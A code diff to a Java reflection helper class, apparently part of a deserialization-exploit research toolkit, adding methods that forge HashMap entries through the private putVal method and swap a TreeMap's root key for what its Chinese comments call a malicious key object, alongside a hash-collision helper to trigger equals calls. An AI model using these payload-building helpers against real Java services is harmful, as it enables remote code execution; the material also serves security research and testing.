@@ -1,18 +1,15 @@
-package exp.tools;
+package tools;
 
 import javassist.CannotCompileException;
 import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtField;
 
-import javax.swing.undo.CompoundEdit;
 import java.io.*;
-import java.lang.reflect.Array;
-import java.lang.reflect.Constructor;
-import java.lang.reflect.Field;
-import java.lang.reflect.Modifier;
+import java.lang.reflect.*;
 import java.util.Base64;
 import java.util.HashMap;
+import java.util.TreeMap;
 import java.util.concurrent.ConcurrentHashMap;
 
 public class ReflectTools {
@@ -56,9 +53,9 @@ public class ReflectTools {
         field.set(object, newValue);
     }
 
-    public static Object getFieldValue(Object obj, String fieldName) throws NoSuchFieldException, IllegalAccessException {
+    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
+//        UnsafeTools.patchModule(ReflectTools.class, CompoundEdit.class);
         try {
-            UnsafeTools.patchModule(ReflectTools.class, CompoundEdit.class);
         } catch (Exception e) {
             throw new RuntimeException(e);
         }
@@ -76,7 +73,7 @@ public class ReflectTools {
         return null;
     }
 
-    public static HashMap<Object, Object> makeMap (Object v1, Object v2 ) throws Exception {
+    public static HashMap<Object, Object> makeMap1(Object v1, Object v2 ) throws Exception {
         HashMap<Object, Object> s = new HashMap<>();
         setFieldValue(s, "size", 2);
         Class<?> nodeC;
@@ -95,6 +92,39 @@ public class ReflectTools {
         return s;
     }
 
+    private static HashMap<Object, Object> makeMap2(Object v1, Object v2) throws Exception {
+        HashMap<Object, Object> map = new HashMap<>();
+        Method putValMethod = HashMap.class.getDeclaredMethod("putVal", int.class, Object.class, Object.class, boolean.class, boolean.class);
+        putValMethod.setAccessible(true);
+        putValMethod.invoke(map, 0, v1, 123, false, true);
+        putValMethod.invoke(map, 1, v2, 123, false, true);
+        return map;
+    }
+
+    /**
+     * 修改 key 的值
+     * @param key
+     * @return
+     * @throws Exception
+     */
+    public static TreeMap<Object, Object > makeTreeMap (TreeMap<Object, Object> treeMap, Object key) throws Exception {
+        // 4. 通过反射获取 TreeMap 的 root 字段
+        Field rootField = TreeMap.class.getDeclaredField("root");
+        rootField.setAccessible(true);
+        Object rootEntry = rootField.get(treeMap);
+        // 此时 rootEntry 是 TreeMap$Entry 类型，Key 是 "any"
+
+        // 5. 获取 TreeMap$Entry 类的 key 字段
+        // 因为 Entry 是私有内部类，我们通过对象实例获取其 Class
+        Field keyField = rootEntry.getClass().getDeclaredField("key");
+        keyField.setAccessible(true);
+
+        // 6. 【关键】将无害的 Key 替换为恶意的 key 对象
+        keyField.set(rootEntry, key);
+
+        return treeMap;
+    }
+
     // 制作hash冲突map，实现调用called.equals(param)
     public static HashMap<Object, Object> makeEqualMap(Object called, Object param) throws Exception {
         HashMap<Object, Object> hashMap1 = new HashMap<>();
@@ -104,7 +134,7 @@ public class ReflectTools {
         hashMap2.put("zZ", param);
         hashMap2.put("yy", called);
 
-        HashMap<Object, Object> finalMap = makeMap(hashMap2, hashMap1);
+        HashMap<Object, Object> finalMap = makeMap1(hashMap2, hashMap1);
 
         return finalMap;
     }
@@ -206,6 +236,8 @@ public class ReflectTools {
             return ois.readObject();
         }
     }
+
+
 
 
 }
